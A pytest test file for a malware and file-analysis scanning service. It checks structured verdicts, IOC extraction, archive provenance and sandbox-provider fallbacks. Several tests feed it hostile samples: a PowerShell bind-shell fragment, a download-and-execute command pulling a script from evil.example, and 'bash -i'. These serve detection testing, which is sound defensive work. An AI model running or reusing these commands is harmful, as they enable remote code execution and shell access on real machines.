import io
import sys
from pathlib import Path

import pytest
from starlette.datastructures import UploadFile

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from backend.server.websockets import manager
from backend.services.file_dynamic.providers import (
    DynamicEvidenceItem,
    DynamicIOCItem,
    DynamicResultPayload,
    FakeDynamicAnalysisProvider,
    NoOpDynamicAnalysisProvider,
)
from backend.services.alerts_service import AlertsService
from backend.services.file_analysis_service import FileAnalysisService, MAX_FILE_SIZE_MB


class FakeSession:
    def add(self, obj):
        return None

    def commit(self):
        return None

    def refresh(self, obj):
        return None

    def rollback(self):
        return None


def _service() -> FileAnalysisService:
    try:
        return FileAnalysisService.get_instance()
    except RuntimeError:
        models_store = ROOT / "backend" / "data" / "models_store"
        yara_rules = ROOT / "backend" / "yara_rules" / "basic_rules.yar"
        return FileAnalysisService(
            ml_model_path=str(models_store / "file_analyzer_v1.joblib"),
            yara_rules_path=str(yara_rules),
            alerts_service=AlertsService(),
        )


@pytest.mark.asyncio
async def test_structured_verdict_is_present_for_benign_scan():
    svc = _service()
    payload = b"hello world from a harmless text file"

    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename="hello.txt"),
    )

    verdict = result.get("structured_verdict") or {}
    assert verdict.get("analysis_id") == result.get("analysis_id")
    assert verdict.get("classification") in {"safe", "suspicious", "blocked"}
    assert verdict.get("severity") in {"low", "medium", "high"}
    assert "declared_type" in verdict
    assert "detected_type" in verdict
    assert isinstance(verdict.get("matched_rules"), list)
    assert isinstance(verdict.get("evidence_items"), list)
    assert isinstance((verdict.get("dynamic_analysis") or {}).get("dynamic_status"), str)
    assert (verdict.get("dynamic_analysis") or {}).get("dynamic_status") == "not_requested"
    assert (verdict.get("dynamic_analysis") or {}).get("request_decision") in {
        "not_requested",
        "skip_low_risk",
        "skip_policy_exempt",
        "skip_unsupported",
        "skip_size_limit",
    }
    assert isinstance(verdict.get("analysis_stages"), list)
    assert isinstance(verdict.get("analyst_summary"), str)


@pytest.mark.asyncio
async def test_suspicious_sample_still_returns_structured_verdict():
    svc = _service()
    payload = (
        b'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener'
        b'(\'0.0.0.0\', 443); $listener.start(); $client = $listener.AcceptTcpClient();'
        b' $stream = $client.GetStream(); $sendback = (iex 2>&1 | Out-String);'
        b' $stream.Write($sendbyte, 0, $sendbyte.Length);"'
    )

    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename="bind-shell.txt"),
    )

    overall = result["overall_assessment"]
    verdict = result.get("structured_verdict") or {}

    assert overall["recommended_action"].startswith(("BLOCK", "FLAG"))
    assert verdict.get("classification") in {"suspicious", "blocked"}
    assert isinstance(verdict.get("evidence_items"), list)
    assert len(verdict.get("analysis_stages") or []) >= 3
    assert isinstance(verdict.get("iocs"), list)
    assert len(verdict.get("iocs") or []) >= 1


@pytest.mark.asyncio
async def test_side_effects_run_after_structured_verdict(monkeypatch):
    svc = _service()
    order = []

    original_build_verdict = svc._build_structured_verdict
    original_emit = svc._persist_emit_alerts_from_verdict

    def wrapped_build_verdict(*args, **kwargs):
        order.append("build_verdict")
        return original_build_verdict(*args, **kwargs)

    def wrapped_emit(*args, **kwargs):
        order.append("emit_side_effects")
        return original_emit(*args, **kwargs)

    monkeypatch.setattr(svc, "_build_structured_verdict", wrapped_build_verdict)
    monkeypatch.setattr(svc, "_persist_emit_alerts_from_verdict", wrapped_emit)

    payload = b"plain harmless content"
    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename="plain.txt"),
    )

    assert result.get("analysis_id")
    assert "build_verdict" in order
    assert "emit_side_effects" in order
    assert order.index("build_verdict") < order.index("emit_side_effects")


def test_broadcast_nowait_is_safe_without_running_event_loop():
    assert manager.broadcast_nowait('{"type":"file_scan","tenant_id":"tenant-default"}') is False


@pytest.mark.asyncio
async def test_ioc_normalization_and_dedup_for_text_payload():
    svc = _service()
    payload = (
        b"Contact: secops@example.com\n"
        b"Suspicious URL: https://evil.example/login?u=1\n"
        b"Mirror URL: https://evil.example/login?u=1\n"
        b"IP IOC: 198.51.100.42\n"
        b"Windows path: C:\\Users\\Public\\payload.exe\n"
        b"Unix path: /tmp/dropper.sh\n"
        b"Command: powershell -c \"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')\"\n"
        b"Known hash: d41d8cd98f00b204e9800998ecf8427e\n"
    )

    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename="ioc-sample.txt"),
    )

    verdict = result.get("structured_verdict") or {}
    iocs = verdict.get("iocs") or []
    assert iocs, verdict
    types = {str(item.get("type")) for item in iocs}
    assert "url" in types
    assert "domain" in types
    assert "ip" in types
    assert "email" in types
    assert "hash" in types
    assert "path" in types
    assert "command" in types

    dedup_keys = [str(item.get("dedup_key")) for item in iocs]
    assert len(dedup_keys) == len(set(dedup_keys))


@pytest.mark.asyncio
async def test_nested_archive_ioc_provenance_is_retained():
    svc = _service()
    mem = io.BytesIO()
    import zipfile

    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("nested/shell.txt", "bash -i")

    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(mem.getvalue()), filename="nested.zip"),
    )

    verdict = result.get("structured_verdict") or {}
    iocs = verdict.get("iocs") or []
    path_iocs = [ioc for ioc in iocs if str(ioc.get("type")) == "path"]
    assert path_iocs, iocs
    assert any("nested/shell.txt" in str(ioc.get("value") or "") for ioc in path_iocs)
    assert any(
        any("nested/shell.txt" in str(path) for path in (ioc.get("archive_lineage") or []))
        for ioc in path_iocs
    ), path_iocs


@pytest.mark.asyncio
async def test_dynamic_provider_completion_is_mapped_into_structured_verdict():
    svc = _service()
    provider = FakeDynamicAnalysisProvider(
        completion_polls=0,
        fail=False,
        result_payload=DynamicResultPayload(
            provider="fake",
            submission_id="will-be-overwritten",
            status="completed",
            summary="Behavioral sandbox reported outbound beacon.",
            evidence_items=[
                DynamicEvidenceItem(
                    code="dyn_beacon",
                    label="Outbound beacon observed",
                    severity="high",
                    details={"dest_domain": "c2.dynamic.example"},
                )
            ],
            iocs=[
                DynamicIOCItem(
                    ioc_type="domain",
                    value="c2.dynamic.example",
                    source_stage="dynamic_analysis",
                    confidence=0.91,
                    severity_hint="high",
                )
            ],
        ),
    )

    old_enabled = svc._dynamic_enabled
    old_provider = svc._dynamic_provider
    old_wait = svc._dynamic_max_wait_seconds
    old_poll = svc._dynamic_poll_interval_seconds
    try:
        svc._dynamic_enabled = True
        svc._dynamic_provider = provider
        svc._dynamic_max_wait_seconds = 1.5
        svc._dynamic_poll_interval_seconds = 0.01

        suspicious_payload = (
            b'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener'
            b'(\'0.0.0.0\', 443); $listener.start(); $client = $listener.AcceptTcpClient();'
            b' $stream = $client.GetStream(); $sendback = (iex 2>&1 | Out-String);'
            b' $stream.Write($sendbyte, 0, $sendbyte.Length);"'
        )
        result = await svc.analyze_file(
            FakeSession(),
            UploadFile(file=io.BytesIO(suspicious_payload), filename="dynamic.txt"),
        )
    finally:
        svc._dynamic_enabled = old_enabled
        svc._dynamic_provider = old_provider
        svc._dynamic_max_wait_seconds = old_wait
        svc._dynamic_poll_interval_seconds = old_poll

    verdict = result.get("structured_verdict") or {}
    dyn = verdict.get("dynamic_analysis") or {}
    assert dyn.get("dynamic_status") == "completed"
    assert dyn.get("provider") == "fake"
    assert dyn.get("requested") is True
    assert dyn.get("request_decision") == "request_dynamic"
    assert isinstance(dyn.get("reason_codes"), list) and len(dyn.get("reason_codes") or []) >= 1
    assert isinstance(dyn.get("request_trace"), list) and len(dyn.get("request_trace") or []) >= 1
    assert len(dyn.get("dynamic_iocs") or []) >= 1
    assert any(ioc.get("type") == "domain" and ioc.get("value") == "c2.dynamic.example" for ioc in (dyn.get("dynamic_iocs") or []))
    # Dynamic IOCs are merged into canonical IOC list with provenance.
    merged = verdict.get("iocs") or []
    assert any(str(ioc.get("source_stage") or "").startswith("dynamic:") for ioc in merged), merged


@pytest.mark.asyncio
async def test_dynamic_provider_failure_preserves_static_verdict():
    svc = _service()
    provider = FakeDynamicAnalysisProvider(completion_polls=0, fail=True, failure_reason="sandbox_timeout")

    old_enabled = svc._dynamic_enabled
    old_provider = svc._dynamic_provider
    old_wait = svc._dynamic_max_wait_seconds
    old_poll = svc._dynamic_poll_interval_seconds
    try:
        svc._dynamic_enabled = True
        svc._dynamic_provider = provider
        svc._dynamic_max_wait_seconds = 0.6
        svc._dynamic_poll_interval_seconds = 0.01

        result = await svc.analyze_file(
            FakeSession(),
            UploadFile(file=io.BytesIO(b"safe static payload"), filename="safe.txt"),
        )
    finally:
        svc._dynamic_enabled = old_enabled
        svc._dynamic_provider = old_provider
        svc._dynamic_max_wait_seconds = old_wait
        svc._dynamic_poll_interval_seconds = old_poll

    overall = result.get("overall_assessment") or {}
    verdict = result.get("structured_verdict") or {}
    dyn = verdict.get("dynamic_analysis") or {}
    assert overall.get("overall_status") == "Safe"
    assert dyn.get("dynamic_status") in {"not_requested", "failed", "unavailable"}
    assert dyn.get("request_decision") in {"skip_low_risk", "skip_policy_exempt", "not_requested"}


@pytest.mark.asyncio
async def test_dynamic_policy_skips_unsupported_file_type():
    svc = _service()
    old_enabled = svc._dynamic_enabled
    old_provider = svc._dynamic_provider
    try:
        svc._dynamic_enabled = True
        svc._dynamic_provider = FakeDynamicAnalysisProvider()
        result = await svc.analyze_file(
            FakeSession(),
            UploadFile(file=io.BytesIO(b"\x00\x01\x02\x03"), filename="sample.bin"),
        )
    finally:
        svc._dynamic_enabled = old_enabled
        svc._dynamic_provider = old_provider

    dyn = (result.get("structured_verdict") or {}).get("dynamic_analysis") or {}
    assert dyn.get("requested") is False
    assert dyn.get("request_decision") == "skip_unsupported"
    assert "unsupported_file_type" in (dyn.get("reason_codes") or [])
    assert isinstance(dyn.get("request_trace"), list) and dyn.get("request_trace")


@pytest.mark.asyncio
async def test_dynamic_policy_skips_oversized_file():
    svc = _service()
    old_enabled = svc._dynamic_enabled
    old_provider = svc._dynamic_provider
    try:
        svc._dynamic_enabled = True
        svc._dynamic_provider = FakeDynamicAnalysisProvider()
        too_large = b"a" * ((MAX_FILE_SIZE_MB * 1024 * 1024) + 128)
        result = await svc.analyze_file(
            FakeSession(),
            UploadFile(file=io.BytesIO(too_large), filename="huge.txt"),
        )
    finally:
        svc._dynamic_enabled = old_enabled
        svc._dynamic_provider = old_provider

    dyn = (result.get("structured_verdict") or {}).get("dynamic_analysis") or {}
    assert dyn.get("requested") is False
    assert dyn.get("request_decision") == "skip_size_limit"
    assert "oversize_file" in (dyn.get("reason_codes") or [])


@pytest.mark.asyncio
async def test_dynamic_policy_reports_provider_unavailable():
    svc = _service()
    old_enabled = svc._dynamic_enabled
    old_provider = svc._dynamic_provider
    old_exempt = set(svc._dynamic_policy_exempt_exts)
    try:
        svc._dynamic_enabled = True
        svc._dynamic_provider = NoOpDynamicAnalysisProvider()
        svc._dynamic_policy_exempt_exts = set()
        payload = (
            b'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener'
            b'(\'0.0.0.0\', 443); $listener.start(); $client = $listener.AcceptTcpClient();'
            b' $stream = $client.GetStream(); $sendback = (iex 2>&1 | Out-String);'
            b' $stream.Write($sendbyte, 0, $sendbyte.Length);"'
        )
        result = await svc.analyze_file(
            FakeSession(),
            UploadFile(file=io.BytesIO(payload), filename="dynamic-unavailable.txt"),
        )
    finally:
        svc._dynamic_enabled = old_enabled
        svc._dynamic_provider = old_provider
        svc._dynamic_policy_exempt_exts = old_exempt

    dyn = (result.get("structured_verdict") or {}).get("dynamic_analysis") or {}
    assert dyn.get("requested") is False
    assert dyn.get("request_decision") == "request_but_provider_unavailable"
    assert dyn.get("dynamic_status") == "unavailable"
    assert "provider_unavailable" in (dyn.get("reason_codes") or [])


@pytest.mark.asyncio
async def test_dynamic_policy_reports_http_provider_misconfiguration():
    svc = _service()
    old_enabled = svc._dynamic_enabled
    old_provider = svc._dynamic_provider
    old_requested_provider = str(getattr(svc, "_dynamic_requested_provider_name", "none"))
    old_diag = dict(getattr(svc, "_dynamic_provider_diagnostics", {}) or {})
    configured_status = {}
    try:
        svc.configure_dynamic_runtime(
            enabled=True,
            provider_name="http",
            provider_config={"base_url": ""},
            poll_interval_seconds=0.01,
            max_wait_seconds=0.1,
        )
        configured_status = svc.get_dynamic_provider_status()
        payload = (
            b'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener'
            b'(\'0.0.0.0\', 443); $listener.start(); $client = $listener.AcceptTcpClient();'
            b' $stream = $client.GetStream(); $sendback = (iex 2>&1 | Out-String);'
            b' $stream.Write($sendbyte, 0, $sendbyte.Length);"'
        )
        result = await svc.analyze_file(
            FakeSession(),
            UploadFile(file=io.BytesIO(payload), filename="dynamic-http-misconfigured.txt"),
        )
    finally:
        svc._dynamic_enabled = old_enabled
        svc._dynamic_provider = old_provider
        svc._dynamic_requested_provider_name = old_requested_provider
        svc._dynamic_provider_diagnostics = old_diag

    dyn = (result.get("structured_verdict") or {}).get("dynamic_analysis") or {}
    assert dyn.get("request_decision") == "request_but_provider_unavailable"
    assert dyn.get("dynamic_status") == "unavailable"
    assert "provider_unavailable" in (dyn.get("reason_codes") or [])
    provider_status = configured_status
    assert provider_status.get("available") is False
    assert provider_status.get("readiness_state") == "misconfigured"
    validation = provider_status.get("validation") or {}
    assert isinstance(validation, dict)
